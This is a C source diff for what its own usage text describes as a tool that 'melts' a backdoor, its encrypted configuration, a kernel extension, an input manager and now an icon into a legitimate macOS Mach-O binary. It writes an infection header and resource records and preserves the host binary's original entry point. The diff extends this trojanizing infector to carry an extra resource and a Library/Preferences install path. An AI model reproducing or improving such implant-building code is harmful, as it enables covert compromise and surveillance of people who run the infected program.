@@ -141,7 +141,7 @@ int appendData (char *inputFilePointer,
                 unsigned int segmentVMAddr)
 {
   char *tempFilePointer   = NULL;
-  const char *_strings[]  = { "HOME", "/%s/%s", "/%s", "" };
+  const char *_strings[]  = { "HOME", "%s/%s/%s/", "%s/%s", "/%s", "Library", "Preferences", "" };
   
   unsigned int originalEP = 0;
   int tempFileSize        = 0; 
@@ -158,9 +158,9 @@ int appendData (char *inputFilePointer,
   resourceHeader  resource;
   
   if (gKextFileSize > 0)
-    numberOfResources = 4;
+    numberOfResources = 5;
   else
-    numberOfResources = 3;
+    numberOfResources = 4;
   
   originalEP = getBinaryEP ((byte *)(inputFilePointer + archOffset));
 #ifdef DEBUG
@@ -171,6 +171,7 @@ int appendData (char *inputFilePointer,
   char *confFileName          = basename(confFilePath);
   char *kextFileName          = basename(kextFilePath);
   char *inputManagerFileName  = basename(inputManagerFilePath);
+  char *iconFileName          = basename(iconFilePath);
   char *inputFileName         = basename(inputFilePath);
   char *outputFileName        = basename(outputFilePath);
 
@@ -185,7 +186,7 @@ int appendData (char *inputFilePointer,
   
   memcpy (outputFilePointer + offset, &infection, sizeof (infectionHeader));
   offset += sizeof (infectionHeader);
-  
+
   //
   // Set the string table
   //
@@ -194,6 +195,7 @@ int appendData (char *inputFilePointer,
       memset (&strings, 0, sizeof (stringTable));
 #ifdef WIN32
       strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
+      printf("string[%d]= %s\n", z, strings.value);
 #else
       strncpy (strings.value, _strings[z], sizeof (strings.value));
 #endif
@@ -426,6 +428,9 @@ int appendData (char *inputFilePointer,
           tempFilePointer,
           gInputManagerFileSize);
 
+  offset += gInputManagerFileSize;
+  tempFileSize = 0;
+
 #ifdef WIN32
   if(tempFilePointer != NULL)
     UnmapViewOfFile(tempFilePointer);
@@ -436,6 +441,52 @@ int appendData (char *inputFilePointer,
   close (tempFD);
 #endif
   
+  //
+  // ICON
+  //
+  resource.type = RESOURCE_ICON;
+  memset (resource.name, 0, sizeof (resource.name));
+  memcpy (resource.name, iconFileName, sizeof (resource.name));
+  resource.size = gIconFileSize;
+  memset (resource.path, 0, sizeof (resource.path));
+  memcpy (resource.path, installPath, sizeof (resource.path));
+
+  memcpy (outputFilePointer + offset,
+          &resource,
+          sizeof (resourceHeader));
+
+  offset += sizeof (resourceHeader);
+#ifdef WIN32
+  if ((tempFilePointer = mapFile (iconFilePath, &tempFileSize,
+      &tempFD, &tempFDMap, 0)) == NULL)
+#else 
+  if ((tempFilePointer = mapFile (iconFilePath, &tempFileSize,
+      &tempFD, 0)) == NULL)
+#endif
+    {
+      printf("[ee] Error while mmapping the configuration file\n");
+      exit (1);
+    }
+
+  memcpy (outputFilePointer + offset,
+          tempFilePointer,
+          gIconFileSize);
+  
+  offset += gIconFileSize;
+  tempFileSize = 0;
+
+#ifdef WIN32
+  if(tempFilePointer != NULL)
+    UnmapViewOfFile(tempFilePointer);
+
+  CloseHandle(tempFDMap);
+  CloseHandle(tempFD);
+#else
+  close (tempFD);
+
+  tempFilePointer = NULL;
+#endif
+
   return offset;
 }
 
@@ -786,7 +837,7 @@ void
 usage (_mChar *aBinaryName)
 {
 #ifdef WIN32
-	printf ("\nUsage: %S <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
+	printf ("\nUsage: %S <core> <conf> <kext> <imanager> <icon> <path> <input> <output>\n\n", aBinaryName);
 #else
   printf ("\nUsage: %s <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
 #endif
@@ -794,6 +845,7 @@ usage (_mChar *aBinaryName)
   printf ("\t<conf>     : backdoor encrypted configuration\n");
   printf ("\t<kext>     : kernel extension\n");
   printf ("\t<imanager> : input manager\n");
+  printf ("\t<icon>     : icon\n");
   printf ("\t<path>     : backdoor installation path (on target)\n");
   printf ("\t<input>    : binary to melt with\n");
   printf ("\t<output>   : output filename\n\n");
@@ -802,7 +854,7 @@ usage (_mChar *aBinaryName)
 int
 parseArguments (int argc, _mChar **argv)
 {
-	if (argc != 8)
+	if (argc != 9)
     {
       return kErrorGeneric;
     }
@@ -827,9 +879,10 @@ parseArguments (int argc, _mChar **argv)
   confFilePath          = argv[2];
   kextFilePath          = argv[3];
   inputManagerFilePath  = argv[4];
-  installPath           = argv[5];
-  inputFilePath         = argv[6];
-  outputFilePath        = argv[7];
+  iconFilePath          = argv[5];
+  installPath           = argv[6];
+  inputFilePath         = argv[7];
+  outputFilePath        = argv[8];
 
   return kSuccess;
 }
@@ -864,7 +917,7 @@ main (int argc, _mChar *argv[])
   int fileType                = 0;
   int padding                 = 0;
   int i                       = 0;
-  gNumStrings                 = 4;
+  gNumStrings                 = 7;
  
 #ifdef WIN32
   HANDLE inputFD, outputFD, inputFDMap, outputFDMap;
@@ -931,6 +984,15 @@ main (int argc, _mChar *argv[])
         }
     }
 
+  if ((gIconFileSize = getFileSize (iconFilePath)) == kErrorGeneric)
+    {
+      printf ("[ee] Icon file not found\n");
+#ifdef WIN32
+      //freeArguments();
+#endif
+      exit (1);
+    }
+
   // Map input file
 #ifdef WIN32
   if ((inputFilePointer = mapFile (inputFilePath,
@@ -959,9 +1021,10 @@ main (int argc, _mChar *argv[])
                     + gConfFileSize
                     + gKextFileSize
                     + gInputManagerFileSize
+                    + gIconFileSize
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
-                    + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 4 : 3);
+                    + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 5 : 4);
 
 #ifdef DEBUG_VERBOSE
   printf ("unpadded outSize: %d\n", outputFileSize);
@@ -1056,8 +1119,8 @@ main (int argc, _mChar *argv[])
     {
     case kFatBinary:
       {
-        gFileType = 1;
-        int x86Found      = 0;
+        gFileType     = 1;
+        int x86Found  = 0;
 
         gFileType = 1;
         nfat = gFatHeader.nfat_arch;
